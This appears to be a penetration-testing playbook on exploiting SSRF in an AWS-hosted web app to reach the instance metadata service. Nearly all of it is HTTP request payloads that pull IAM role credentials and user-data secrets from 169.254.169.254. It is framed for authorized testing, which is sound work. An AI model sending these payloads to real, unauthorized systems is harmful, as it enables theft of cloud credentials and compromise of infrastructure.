# AWS IMDS SSRF Exploitation

## When to Use
- During a penetration test of a web application hosted on AWS EC2 or ECS that exhibits SSRF vulnerabilities.
- To demonstrate impact by escalating from a web vulnerability to AWS cloud infrastructure compromise via IAM credential theft.


## Prerequisites
- Authorized scope and rules of engagement for the target environment
- Appropriate tools installed on the attack/analysis platform
- Understanding of the target technology stack and architecture
- Documentation template ready for findings and evidence capture

## Workflow

### Phase 1: Identifying the SSRF

```http
# Concept: Test the target application for SSRF GET /fetch_url?url=http://example.com HTTP/1.1
Host: target.app
```

### Phase 2: Querying AWS IMDSv1

```http
# GET /fetch_url?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1
Host: target.app
```

### Phase 3: Extracting IAM Roles and Credentials

```http
# GET /fetch_url?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ HTTP/1.1

# GET /fetch_url?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/WebServerRole HTTP/1.1
```
*(The response will contain a JSON object with `AccessKeyId`, `SecretAccessKey`, and `Token`)*

### Phase 4: Accessing User Data

```http
# # GET /fetch_url?url=http://169.254.169.254/latest/user-data HTTP/1.1
```
*(User Data often contains sensitive initialization scripts, database passwords, or API keys).*
